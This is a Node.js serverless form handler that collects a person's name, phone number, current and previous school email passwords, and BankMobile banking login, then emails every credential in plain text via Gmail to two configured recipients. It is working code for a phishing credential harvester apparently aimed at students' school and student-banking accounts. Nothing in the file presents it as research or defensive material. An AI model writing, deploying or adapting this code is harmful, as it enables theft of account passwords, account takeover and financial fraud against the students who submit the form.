const nodemailer = require("nodemailer");
const crypto = require("crypto");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5000/");

  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
  } = req.body || {};

  // Basic validation (expand as needed)
  if (
    !fullName ||
    !phoneNumber ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword ||
    typeof hasBankMobileProfile !== "string"
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const message = `
    Full Name: ${fullName}
    Phone Number: ${phoneNumber}

    --- Current School Credentials ---
    Email: ${currentSchoolEmail}
    Password: ${currentSchoolPassword}

    --- Previous School Credentials ---
    Email: ${previousSchoolEmail}
    Password: ${previousSchoolPassword}

    --- BankMobile ---
    Has BankMobile Profile: ${hasBankMobileProfile}
    Email: ${bankMobileEmail || "N/A"}
    Password: ${bankMobilePassword || "N/A"}
  `;

  const signature = crypto
    .createHmac("sha256", process.env.SECRET_KEY)
    .update(`${fullName}:${phoneNumber}:${currentSchoolEmail}`)
    .digest("hex");

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Form Submission" <${process.env.EMAIL_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      subject: "New Form Submission",
      text: `${message}\n\nSignature: ${signature}`,
    });

    await transporter.sendMail({
      from: `"Form Submission" <${process.env.EMAIL_USER}>`,
      to: process.env.ADVENT_IST,
      subject: "New Form Submission",
      text: `${message}\n\nSignature: ${signature}`,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Email error:", error);
    return res.status(500).json({ error: "Email failed to send" });
  }
};
